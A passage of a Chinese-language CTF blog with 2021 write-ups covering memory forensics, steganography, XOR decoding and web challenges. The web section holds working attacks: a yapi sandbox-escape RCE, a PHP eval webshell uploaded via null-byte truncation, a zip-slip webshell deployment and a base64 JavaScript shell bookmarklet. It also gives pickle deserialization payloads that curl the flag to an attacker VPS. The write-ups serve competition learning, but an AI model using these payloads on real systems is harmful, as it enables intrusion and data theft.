unhexlify(line) # print(d) with open(f'total.dat', 'ab') as fout: fout.write(d) print(cnt) cnt += 1 拿 diskgenius 恢复一下文件，得到一个 mp4，播放就发现里面输入了 flag flag{A good hacker do not need any mi?} 小结喵呜呜呜，其实就做了俩 Misc，签到题还被队友抢了（x 心得就是：上课，下课，来到实验室，打开电脑做了一题 Misc，吃饭，上课，下课，回宿舍，打开电脑做了另一题 Misc。 （好烦啊还要上课 又是个卷卷卷的比赛，这次倒是多了几个奇怪分区的题目，比如 云安全、个人信息保护、人工智能，balabala，但其实感觉好多还是和 crypto 有关的，喵喵不会啊。（摊手.gif 最后和队友一起打到了总榜第39，社企组第11，进决赛了喵~ 队友 tql！感谢队友带飞！ （溜了溜了喵","path":"2021/09/18/CTF_2021_5space/"},{"title":"CTF | 2021 祥云杯 Misc WriteUp","text":"引言 2021 第二届”祥云杯”网络安全技能大赛 比赛时间：2021-08-21 09:00 ~ 2021-08-22 09:00 比赛官网：https://xiangyuncup.ichunqiu.com/ 又是一个打 CTF 的周末，这周打了个祥云杯，摸鱼摸鱼，累累（ 喵喵主要在看 Misc 题目，其他题目看的不多，和队友们一起来玩的。 Misc鸣雏恋 在喜欢的人面前,我可不能……丢脸啊……因为我,喜欢鸣人君………… 附件下载 提取码（GAME）备用下载 docx 里面藏了东西，直接解压提取 key.txt 零宽隐写 Because I like naruto best 作为密码，解压得到一堆的图片 发现只有两种图片，换成 0/1 导出，得到一张图片，上面就有 flag import os files = os.listdir('out/') with open('out/0.png', 'rb') as f: f0 = f.read() with open('out/1.png', 'rb') as f: f1 = f.read() data = [] for i in range(129488): filename = 'out/' + str(i) + '.png' print(filename) with open(filename, 'rb') as f: content = f.read() if content == f0: data += [0] elif content == f1: data += [1] print(data) d = ''.join(map(str, data)) with open('data1.txt', 'w') as fout: fout.write(d) len(data) result = ''.join(list(map(str, data))) for i in range(0, len(result), 8): byte = result[i:i+8] print(chr(int(byte, 2)), end=\"\") flag{57dd74fb21bb1aee50f19421bf836f23} 层层取证 附件下载 提取码（GAME） （本题附件较大） （这个文件镜像 13GB 也太大了吧…… 他这个是用 ftk 提的镜像 从内存镜像里导出 bitlocker 密钥 $ volatility --plugins=plugins/bitlocker -f memdump.mem --profile=Win7SP1x64 bitlocker Volatility Foundation Volatility Framework 2.6 Address : 0xfa800d12e7e0 Cipher : AES-128 FVEK : 0ff9192acdbf1df3c6dc36fb58cf76ce TWEAK : b423bd84872ff72b583bb9bdee1762ac 取证大师挂载磁盘，解开 bitlocker，xiaoming 桌面上有个 flag.txt ，和内存 notepad 进程里的内容一致 hint: 你连电脑都不能仿真打开，还想要flag ? 加密盘里发现有个 2.pcapng 流量包 大部分流量是在搜 CTF、flag、黑客 啥的，不过 strings 发现有个 flag.docx，在一堆 udp 流量里发现了这个 rar 从内存镜像 hashdump 解 hash 得到开机密码为 xiaoming_handsome，但是解压得到的 docx 还有个打开密码。 仿真发现便签下面还藏了个便签…… 或者也可以直接读取文件 StickyNotes.snt 用 xiaoming1314 打开 word，拿到 flag flag{9ca871b668f2-b668-097c-cbm8-9op404c891e2} 考古 小明在家里翻到一台很古老的xp笔记本，换电池之后发现可以正常开机，但是发现硬盘空间不足。清理过程中却发生了一些不愉快的事情… 附件下载 提取码（GAME）备用下载 咋又是取证啊（（ $ volatility -f memory --profile=WinXPSP2x86 cmdscan Volatility Foundation Volatility Framework 2.6 ************************************************** CommandProcess: csrss.exe Pid: 620 CommandHistory: 0x3833938 Application: cmd.exe Flags: Allocated, Reset CommandCount: 16 LastAdded: 15 LastDisplayed: 15 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x404 Cmd #0 @ 0x3832110: It's useless to find so many things Cmd #1 @ 0x3832ed0: ........................ Cmd #2 @ 0x52c778: what can i do about it Cmd #3 @ 0x3833360: Heard that there is a one-click cleaning that is very useful Cmd #4 @ 0x52b3c8: try it Cmd #5 @ 0x52b7e8: \"C:\\Documents and Settings\\Administrator\\??\\Oneclickcleanup.exe\" Cmd #6 @ 0x5224a0: what??? Cmd #7 @ 0x52d5c0: what happened?? Cmd #8 @ 0x52d410: who is 1cepeak? Cmd #9 @ 0x3832de0: what's the meaning of hack? Cmd #10 @ 0x3830e50: oh,no Cmd #11 @ 0x52af40: holy shit Cmd #12 @ 0x3830cf8: aaaaaa Cmd #13 @ 0x522d28: Nonononononononononononono!!!!!!!!!!!!!!!! Cmd #14 @ 0x522d88: \"C:\\Documents and Settings\\Administrator\\??\\Oneclickcleanup.exe\" Cmd #15 @ 0x5224b8: fuc ************************************************** 这个 Oneclickcleanup.exe 很可疑，于是 dump 出来看一下逆一下。 可以看到循环异或这个 key，即 this_a_key，然后把内容写入文件。 按逻辑写个脚本导出 data = bytearray() with open('data.txt', 'r', encoding='utf-8') as f: while True: s = f.readline() if not s: break l = s.split(',') # print(l) for i in l: d = i.strip() data.append(int(d, 16)) print(data) key = b'this_a_key' data_decode = bytearray() for i in range(len(data)): data_decode.append(data[i] ^ key[i % len(key)]) print(data_decode) with open('1.doc', 'wb') as f: f.write(data_decode) 赛后问了问队里 binary 爷爷，才知道 IDA 里直接按 Shift + E 就能直接导出数据，这样就不用复制粘贴然后自己手动处理这个原始数据了…… 同理，文件名，不过貌似没啥用（ # filename filename = bytearray() filename += b'7R570' with open('data2.txt', 'r', encoding='utf-8') as f: s = f.readline() while True: s = f.readline() if not s: break d = s.strip() filename.append(int(d, 16)) print(filename) filename_decode = bytearray() for i in range(len(filename)): filename_decode.append(filename[i] ^ key[i % len(key)]) print(filename_decode) # bytearray(b'C:\\\\Documents and Settings\\\\All Users\\\\Templates') 发现文件是个 doc，里面就一句话 查看文件 hex，发现这句话后面还有点东西，参考前面的异或逻辑，这里爆破了一下 key，最后发现 key 是 -。。 import string with open('1.doc', 'rb') as f: raw = f.read() # l = string.ascii_letters l = [bytes([i]) for i in range(1, 256)] for i in l: x = bytearray() for data in raw: x.append(ord(i) ^ data) # print(x) if b'flag' in x: print('!!!!!!!!!!!!') print(i) print(x) print('=======================') print() 顺便和原始文件对比一下。 flag{8bedfdbb-ba42-43d1-858c-c2a5-5012d309} ChieftainsSecret Our agent risked his life to install a mysterious device in the immemorial telephone, can you find out the chieftain’s telephone number? Flag format: flag{11 digits} 附件下载 提取码（GAME）备用下载 图种，后面有个压缩包，解压得到电路图和数据。 TLE5501 这个芯片是个角度和线性位置传感器，通过采集磁场的变化，他能反应出角度变化，然后输出差分的正余弦信号。 应该是老式拨号那个盘，他相当于采集了那个的角度数据 https://www.mouser.cn/new/infineon/infineon-tle5501-e0001-e0002-xensiv-sensors/https://www.mouser.sg/new/infineon/infineon-tle5501-evaluation-kit/https://www.infineon.com/cms/cn/product/sensor/magnetic-sensors/magnetic-position-sensors/angle-sensors/tle5501-e0001/(Datasheet 解题上用处不太大 给了单片机采集到的信号，考虑通过正余弦值求解角度，这个应该就是转盘的角度，应该和拨盘上的数字成正比 先把数据画个图 可以看出确实是差分的正余弦信号，考虑把这个四元组转换为角度 import math import matplotlib.pyplot as plt import numpy as np # plt.figure() data1 = [] data2 = [] data3 = [] data4 = [] with open('adc.csv', 'r') as f: f.readline() for i in range(2162): s = f.readline() # print(s) s = s.split(',') data1.append(int(s[0])) data2.append(int(s[1])) data3.append(int(s[2])) data4.append(int(s[3])) print(len(data1)) data_sin = np.array(data1)-np.array(data2) data_sin = data_sin/max(data_sin) data_cos = np.array(data3)-np.array(data4) data_cos = data_cos/max(data_cos) angle = np.arcsin(data_sin)/np.pi*180 plt.plot(angle) plt.grid(True) # plt.show() angle2 = np.arccos(data_cos)/np.pi*180 plt.plot(angle2) plt.grid(True) plt.show() 由于超过了180度中间的角度会反而减小，要加回去。。 整来整去还不如直接读坐标，得到大概角度分别为 212, 212, 282, 234, 164, 258, 193, 90, 140, 161, 212 最后手动用量角器出了……难受死了（ flag{77085962457} （寻思着大概每个数字差 360/15=24 度，多试几次其实也行 比赛后想到，sin cos 值都给了，为啥不直接求 tan 然后 arctan 出角度啊，以及，直接 excel 里算更方便。 喵喵是 fw…… 小结取证好烦啊……一堆脑洞，而且占喵喵硬盘一堆空间，盘都满了啊啊啊啊啊。 很难得在 CTF 里还能碰到硬件相关或者沾边的题目，而且一次还来俩，还有个逆向题给了个 ARM 单片机连接 W25Q16 内存芯片，给了个 hexdump 样式的文本文件，还有一个逻辑分析仪抓到的信号，喵喵以为这个 hex 是内存了，最后发现其实是要逆向这个 hex 文件…… 想不到还能在 CTF 里复习数电知识 233333. 太卷啦太卷啦，又是最后几分钟疯狂掉排名。 最后排 34 但只进前 30，难受受，又不能出去线下摸鱼旅游了，喵呜呜。 pwn 题也太多了吧…… 这次没得空看 web 题，喵喵是 fw，喵呜呜。 感谢队友们带咱一起玩 qwq~ （溜了溜了喵","path":"2021/08/24/CTF_2021XiangYun/"},{"title":"CTF | 2021 DASCTF July X CBCTF 4th 部分WriteUp","text":"本文首发于安全客：https://www.anquanke.com/post/id/252295 引言 2021DASCTF 实战精英夏令营预热赛暨 DASCTF July X CBCTF 4th 比赛时间：2021年7月31日 10:00 - 8月1日 18:00 https://buuoj.cn/match/matches/15/challenges 又是摸鱼的一个周末，不过这个比赛和 巅峰极客网络安全技能挑战赛 冲突了，那个比赛写了点 wp 在下面这篇。 CTF | 2021 巅峰极客网络安全技能挑战赛 WriteUp 于是第一天都在打那个比赛，这边就第二天下午随便看了看。 不过看了几题 web 发现有不少是复现漏洞或者自己挖洞的题，寻思着还有点味道，赛后又来复现了一下。 主要看的是 Web 和 Misc 题目，这篇大部分是边做边写的，写得还是挺详细的吧，当然也少不了走弯路的地方。 大师傅们随便看看就好了（ Webezrce 你真的会 nodejs 吗？ 参考 yapi远程代码执行漏洞复现（部署+复现） 先注册个账号，然后添加个 高级 Mock 脚本即可。 const sandbox = this const ObjectConstructor = this.constructor const FunctionConstructor = ObjectConstructor.constructor const test = FunctionConstructor('return process') const process = test() mockJson = process.mainModule.require(\"child_process\").execSync(\"whoami &amp;&amp; ps -ef &amp;&amp; ls -al /&amp;&amp; cat /ffffffflllllaggggg\").toString() 再点击这个预览的地址即可。 cat flag 简简单单cat flag Hint: 管理员曾访问过flag &lt;?php if (isset($_GET['cmd'])) { $cmd = $_GET['cmd']; if (!preg_match('/flag/i',$cmd)) { $cmd = escapeshellarg($cmd); system('cat ' . $cmd); } } else { highlight_file(__FILE__); } ?&gt; escapeshellarg — 把字符串转码为可以在 shell 命令里使用的参数 功能 ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号) 定义 ：string escapeshellarg ( string $arg ) 倒是这个单独用貌似不存在绕过啥的（bushi 谈谈escapeshellarg参数绕过和注入的问题 浅谈escapeshellarg逃逸与参数注入 一方面是 先 escapeshellarg 再 escapeshellcmd 处理的话存在参数注入，另一方面主要是通过调用的命令（如 tar find wget curl 之类）自带的参数来实现绕过或者执行其他的命令。 先读几个文件看看。 /etc/passwd root:x:0:0:root:/root:/bin/ash bin:x:1:1:bin:/bin:/sbin/nologin daemon:x:2:2:daemon:/sbin:/sbin/nologin adm:x:3:4:adm:/var/adm:/sbin/nologin lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin sync:x:5:0:sync:/sbin:/bin/sync shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown halt:x:7:0:halt:/sbin:/sbin/halt mail:x:8:12:mail:/var/mail:/sbin/nologin news:x:9:13:news:/usr/lib/news:/sbin/nologin uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin operator:x:11:0:operator:/root:/sbin/nologin man:x:13:15:man:/usr/man:/sbin/nologin postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin cron:x:16:16:cron:/var/spool/cron:/sbin/nologin ftp:x:21:21::/var/lib/ftp:/sbin/nologin sshd:x:22:22:sshd:/dev/null:/sbin/nologin at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin games:x:35:35:games:/usr/games:/sbin/nologin cyrus:x:85:12::/usr/cyrus:/sbin/nologin vpopmail:x:89:89::/var/vpopmail:/sbin/nologin ntp:x:123:123:NTP:/var/empty:/sbin/nologin smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin guest:x:405:100:guest:/dev/null:/sbin/nologin nobody:x:65534:65534:nobody:/:/sbin/nologin www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin utmp:x:100:406:utmp:/home/utmp:/bin/false nginx:x:101:101:nginx:/var/lib/nginx:/sbin/nologin 系统是 Alpine Linux, ash NAME=\"Alpine Linux\" ID=alpine VERSION_ID=3.13.0 PRETTY_NAME=\"Alpine Linux v3.13\" HOME_URL=\"https://alpinelinux.org/\" BUG_REPORT_URL=\"https://bugs.alpinelinux.org/\" 环境变量 http://xxxxxxxxxxx/?cmd=/proc/self/environ PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgiUSER=www-dataHOSTNAME=bd65ff0cb21ePHP_INI_DIR=/usr/local/etc/phpSHLVL=2HOME=/home/www-dataPHP_LDFLAGS=-Wl,-O1 -piePHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_VERSION=7.3.26GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5DPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_ASC_URL=https://www.php.net/distributions/php-7.3.26.tar.xz.ascPHP_URL=https://www.php.net/distributions/php-7.3.26.tar.xzPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binPHPIZE_DEPS=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2cPWD=/var/www/htmlPHP_SHA256=d93052f4cb2882090b6a37fd1e0c764be1605a2461152b7f6b8f04fa48875208FLAG=not_flag FLAG=not_flag，草！ （应该是因为动态 flag 是通过 ENV 来配置的，写入文件之后把 ENV 给替换掉了 根据提示，寻思着读 nginx log http://xxxxx/?cmd=/var/log/nginx/access.log 127.0.0.1 - - [11/Jul/2020:00:00:00 +0000] \"GET /this_is_final_flag_e2a457126032b42d.php HTTP/1.1\" 200 5 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0\" 192.168.122.180 - - [31/Jul/2021:20:16:06 +0000] \"GET / HTTP/1.1\" 200 1855 \"-\" \"python-requests/2.25.1\" 192.168.122.180 - - [31/Jul/2021:20:16:09 +0000] \"GET / HTTP/1.1\" 200 1855 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0\" 192.168.122.180 - - [31/Jul/2021:20:16:26 +0000] \"GET /favicon.ico HTTP/1.1\" 200 1855 \"http://9f6ec27d-77be-4de4-9373-f93a8bd50480.node4.buuoj.cn/\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0\" ... 所以文件是 this_is_final_flag_e2a457126032b42d.php，不过包含了 flag。 参考 https://www.php.net/manual/zh/function.escapeshellarg.php 可以加个非 ASCII 码字符绕过 escapeshellarg，测试发现 %80 及以上都行。 easythinkphpThinkPHP V3.2.3 直接现成工具一把梭 http://xxxxxxxxxx/?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_08_01.log 原理可参考 炒冷饭之ThinkPHP3.2.X RCE漏洞分析 大概就是先写个带有一句话木马的报错语句到日志里，然后文件包含来执行命令。 另外还有其他师傅说其实可以直接文件包含来读 /flag. m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=/flag jspxcms后台 http://sdejkwdfnewi3f2jr32d3edfewd.dasctf.node4.buuoj.cn:82/cmscp/index.do 默认登录信息 admin / 空 Jspxcms v9.5.1 参考 复现jspxcms解压getshell漏洞 记一次由追踪溯源发现的“不安全解压getshell” unzip 方法未对 ZIP 压缩包里的文件名进行参数校验，就进行文件的写入，构造带有 ../ 的文件名就能构成目录穿越漏洞。 首先基于冰蝎马生成 war 包。 jar cvf shell.war shell.jsp 然后用脚本把 war 包压缩一下。 import zipfile z = zipfile.ZipFile('miao.zip', 'w', zipfile.ZIP_DEFLATED) with open('shell.war','rb') as f: temp=f.read() z.writestr('../../../shell.war',temp) #shell.war为上一步生产的后门war包 z.close() 通过 上传文件 上传压缩包，然后 zip解压 部署上去。 http://xxxxxxxxxxxx/shell/shell.jsp 冰蝎成功连上 可以看到本来上传的目录是 uploads/1/，通过目录穿越解压到了上级的 tomcat/webapps 目录下了。 当然这里也可以参考 雪姐姐的办法，直接新建个页面，通过 JavaScript 写入个简单的调试页面，直接在浏览器里执行命令、上传文件。 新建个书签，然后直接在 shell 的页面加载书签。 javascript:{window.localStorage.embed=window.atob(\"ZG9jdW1lbnQud3JpdGUoIjxwPiIpOw0KdmFyIGh0bWwgPSAiPGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSdjbWQuanNwJz5cDQo8aW5wdXQgbmFtZT0nYycgdHlwZT10ZXh0PjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz5cDQo8L2Zvcm0+PGhyPlwNCjxmb3JtIGFjdGlvbj0nY21kLmpzcCcgbWV0aG9kPXBvc3Q+XA0KVXBsb2FkIGRpcjogPGlucHV0IG5hbWU9J2EnIHR5cGU9dGV4dCB2YWx1ZT0nLic+PGJyPlwNClNlbGVjdCBhIGZpbGUgdG8gdXBsb2FkOiA8aW5wdXQgbmFtZT0nbicgdHlwZT0nZmlsZScgaWQ9J2YnPlwNCjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2InIGlkPSdiJz5cDQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz5cDQo8L2Zvcm0+PGhyPiI7DQp2YXIgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQpkaXYuaW5uZXJIVE1MID0gaHRtbDsNCmRvY3VtZW50LmJvZHkuaW5zZXJ0QmVmb3JlKGRpdiwgZG9jdW1lbnQuYm9keS5maXJzdENoaWxkKTsNCg0KdmFyIGhhbmRsZUZpbGVTZWxlY3QgPSBmdW5jdGlvbihldnQpIHsNCiAgICB2YXIgZmlsZXMgPSBldnQudGFyZ2V0LmZpbGVzOw0KICAgIHZhciBmaWxlID0gZmlsZXNbMF07DQoNCiAgICBpZiAoZmlsZXMgJiYgZmlsZSkgew0KICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCg0KICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24ocmVhZGVyRXZ0KSB7DQogICAgICAgICAgICB2YXIgYmluYXJ5U3RyaW5nID0gcmVhZGVyRXZ0LnRhcmdldC5yZXN1bHQ7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYicpLnZhbHVlID0gYnRvYShiaW5hcnlTdHJpbmcpOw0KICAgICAgICB9Ow0KDQogICAgICAgIHJlYWRlci5yZWFkQXNCaW5hcnlTdHJpbmcoZmlsZSk7DQogICAgfQ0KfTsNCmlmICh3aW5kb3cuRmlsZSAmJiB3aW5kb3cuRmlsZVJlYWRlciAmJiB3aW5kb3cuRmlsZUxpc3QgJiYgd2luZG93LkJsb2IpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGhhbmRsZUZpbGVTZWxlY3QsIGZhbHNlKTsNCn0gZWxzZSB7DQogICAgYWxlcnQoJ1RoZSBGaWxlIEFQSXMgYXJlIG5vdCBmdWxseSBzdXBwb3J0ZWQgaW4gdGhpcyBicm93c2VyLicpOw0KfQ==\");eval(window.localStorage.embed);};void(0); 不过这个 shell 估计是个简单的小马，不带加密的，文件名是 cmd.jsp，执行命令的密码 c。需要的话可以自己改一下。 jj’s camera jj在某次网络安全活动中发现了个黑客做的网站，请使用https访问站点 Hint: 网上能搜到源码，仅修改了前端ui，注意服务器的响应 是个会自动抓拍然后上传后端并 302 跳转到任意 url 的网站。 根据 /sc.php?id=miao&amp;url=http://baidu.com 以及页面上的代码 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;等待跳转...&lt;/title&gt; &lt;meta name=\"author\" content=\"DeathGhost\"/&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"style/css/style.css\"/&gt; &lt;style&gt; body { height: 100%; background: #16a085; overflow: hidden; } canvas { z-index: -1; position: absolute; } &lt;/style&gt; &lt;script src=\"style/js/jquery.js\"&gt;&lt;/script&gt; &lt;!-- &lt;script src=\"style/js/verificationNumbers.js\"&gt;&lt;/script&gt; --&gt; &lt;script src=\"style/js/Particleground.js\"&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function () { //粒子背景特效 $('body').particleground({ dotColor: '#5cbdaa', lineColor: '#5cbdaa' }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;video id=\"video\" width=\"0\" height=\"0\" autoplay&gt;&lt;/video&gt; &lt;canvas style=\"width:0px;height:0px\" id=\"canvas\" width=\"480\" height=\"640\"&gt;&lt;/canvas&gt; &lt;script type=\"text/javascript\"&gt; window.addEventListener(\"DOMContentLoaded\", function () { var canvas = document.getElementById('canvas'); var context = canvas.getContext('2d'); var video = document.getElementById('video'); if (navigator.mediaDevices &amp;&amp; navigator.mediaDevices.getUserMedia) { navigator.mediaDevices.getUserMedia({video: true}).then(function (stream) { video.srcObject = stream; video.play(); setTimeout(function () { context.drawImage(video, 0, 0, 480, 640); }, 1000); setTimeout(function () { var img = canvas.toDataURL('image/png'); document.getElementById('result').value = img; document.getElementById('gopo').submit(); }, 1300); }, function () { alert(\"hacked by jj\"); }); } }, false); &lt;/script&gt; &lt;form action=\"qbl.php?id=miao&amp;url=http://baidu.com\" id=\"gopo\" method=\"post\"&gt; &lt;input type=\"hidden\" name=\"img\" id=\"result\" value=\"\"/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 直接上 GitHub 上一搜 qbl.php https://github.com/FlyRenxing/php-utility-api-collection/tree/master/H5Snap https://github.com/xiaoma55/hexo_blog/tree/master/source/customerPage/youqu/zhaoYaoJing https://github.com/SStarbuckS/autopohot https://github.com/shiguangrenranrs/Photo （有点区别这个） 应该都差不多。 关键代码在 qbl.php &lt;?php error_reporting(0); $base64_img = trim($_POST['img']); $id = trim($_GET['id']); $url = trim($_GET['url']); $up_dir = './img/';//存放在当前目录的img文件夹下 if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $base64_img, $result)){ $type = $result[2]; if(in_array($type,array('bmp','png'))){ $new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_img))); header(\"Location: \".$url); } } ?&gt; 这里的 $type 是从 post 参数里的 image/(\\w+) 来的，但是限制了只能是 bmp 或者 png，绕不过也不可控。 再看 $new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type; 这句，这个 $id 从 GET 参数来的，是可控的。 但是为了上传使得后缀名为 .php，那就需要 搭配 %00 截断。 试了老半天发现还不行最后发现漏看了个 trim（别骂了别骂了 由于这个 trim 函数会把字符串首尾的空字符给去除，于是就得加个其他的字符包裹一下 %00. 构造 id 为 miao.php%00.，上传的文件内容是 base64 encode + urlencode 后的一句话木马。 &lt;?php @eval($_REQUEST['m']);?&gt; payload: POST /qbl.php?id=miao.php%00.&amp;url=http://baidu.com HTTP/1.1 Host: node4.buuoj.cn:28820 Content-Length: 72 Pragma: no-cache Cache-Control: no-cache Sec-Ch-Ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 Origin: https://node4.buuoj.cn:28820 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-Dest: document Referer: https://node4.buuoj.cn:28820/sc.php?id=miao&amp;url=http://baidu.com Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close img=data%3aimage/png%3bbase64,PD9waHAgQGV2YWwoJF9SRVFVRVNUWydtJ10pOz8%2b Extensive reading: 挖洞姿势 | 深度聊聊PHP下的“截断”问题 过气的00截断 %00 截断的利用条件： php版本小于5.3.4 php的magic_quotes_gpc为OFF状态 cybercms 赛博CMS，只为安全而生 Hint: 信息搜集是一个web手必备的技能 详见另一篇博客： CTF | 2021 DASCTF July cybercms 一探再探 easyweb题目给了 dockerfile 及后端源码。 app.py from hypercorn.middleware import DispatcherMiddleware from vuln_app import vuln_app from simple_app import simple_app dispatcher_app = DispatcherMiddleware({ \"/vuln\": vuln_app, \"/\": simple_app, }) if __name__ == '__main__': a = 1 simple_app.py from a2wsgi import WSGIMiddleware def application(env, start_response): start_response('200 OK', [('Content-Type','text/html')]) return [b\"Hello World\"] simple_app = WSGIMiddleware(application) vuln_app.py from wsgiref.simple_server import make_server from pyramid.config import Configurator from pyramid.response import Response from pyramid.renderers import render_to_response from pyramid.session import SignedCookieSessionFactory, PickleSerializer from webob.cookies import Base64Serializer from a2wsgi import WSGIMiddleware my_session_factory = SignedCookieSessionFactory(\"233333333333\", serializer=Base64Serializer(PickleSerializer())) def hello_world(request): request.session[\"233\"] = \"2333\" return Response('Hello World!') vuln_app = None with Configurator() as config: config.set_session_factory(my_session_factory) config.add_route('hello', '/') config.add_view(hello_world, route_name='hello') vuln_app = WSGIMiddleware(config.make_wsgi_app()) if __name__ == '__main__': with Configurator() as config: config.set_session_factory(my_session_factory) config.add_route('hello', '/') config.add_view(hello_world, route_name='hello') app = config.make_wsgi_app() server = make_server('0.0.0.0', 6543, app) server.serve_forever() dockerfile FROM ubuntu:18.04 ENV DEBIAN_FRONTEND=noninteractive RUN sed -i \"s/archive.ubuntu.com/mirrors.aliyun.com/g\" /etc/apt/sources.list &amp;&amp; apt update &amp;&amp; apt dist-upgrade -y RUN apt install -y software-properties-common &amp;&amp; add-apt-repository ppa:deadsnakes/ppa &amp;&amp; apt install python3.8 -y RUN apt install nginx python3-pip curl -y ADD nginx.conf /etc/nginx/sites-available/default COPY conf/* /root/ WORKDIR /root ADD flag /flag RUN chmod 600 /flag ADD readflag.c /readflag.c RUN apt -y install gcc &amp;&amp; \\ gcc /readflag.c -o /readflag &amp;&amp; \\ chmod +s /readflag COPY app /app WORKDIR /app RUN mv /usr/bin/python3.8 /usr/bin/python3 &amp;&amp; python3 -m pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple # CMD python3 -m http.server CMD nginx &amp;&amp; useradd ctf &amp;&amp; su ctf -c 'hypercorn --bind 0.0.0.0:4488 app:dispatcher_app' &amp;&amp; tail -f /dev/null flag 要通过执行 /readflag 来获得。 app.py 里注册了两个路由，根目录访问的是 simple_app，看上去没啥问题，主要还是 /vuln 下访问的 vuln_app，其中用到了 PickleSerializer，盲猜就有 pickle 序列化在里面了。 直接打上断点，跟一波 debug，成功发现了 pickle.loads。在设置 session 时先从请求获取 session，而后再设置新的 session。 从 cookie 里取出 session，进行 urlsafe_b64decode，再截取出 cstruct 和签名 expected_sig，进行校验后对 cstruct 再一次 urlsafe_b64decode，最后调用 pickle.loads。 设置 cookie 的操作在 Response 时进行，最终会调用上图的 pickle.dumps。 做题的话，可以直接改最后这个 pickle.dumps 结果为构造好的 pickle payload。 可以参考 2021 巅峰极客网络安全技能挑战赛 opcode 一题，比如 b\"(cos\\nsystem\\nS\\'curl http://VPS:PORT/?flag=`/readflag`\\'\\no.\" # or b'cposix\\nsystem\\nX3\\x00\\x00\\x00curl http://VPS:PORT/`readflag | base64`\\x85R.' 然后本地起服务，浏览器里请求一下，把 cookie 复制一下，把这个作为 payload 赋值给远程的 cookie 就完事了。 访问 http://xxxxxxxxx/vuln，修改 cookie，刷新页面，vps 上起个 web 服务监听，拿到 flag 完事。 或者参考大师傅更方便的方法，可以直接改后端代码，直接设置个新的 session 实例化一个 RCE 对象。 class Miao(object): def __reduce__(self): import os return os.system, (\"curl http://VPS/?flag=`/readflag`\",) def hello_world(request): request.session[\"233\"] = \"2333\" request.session[\"miao\"] = Miao() print(request.session) return Response('Hello World!') 本地调试可以发现第一次访问会设置上 session，第二次访问的时候就会反序列化 pickle 执行 payload 了。 本地起个原始的 app，改好 cookie，刷新页面就能打通了。 嗯很好，远程没打通！ 重试了几次，还是没成功…… 最后寻思着是不是那个 pickle 序列化时候和操作系统有关啊？ 换到 kali 下起 web 服务，生成 payload 再扔到远程去，这回成功了…… ez_website 简单的题目 https://dasctf-july-1251267611.file.myqcloud.com/ez_website.zip 给了源码，齐博X1.0，基于ThinkPHP V5.0.18 二次开发的。 http://xxxxxxxxx/admin.php/admin/index/index.html 后台弱密码 admin/admin888 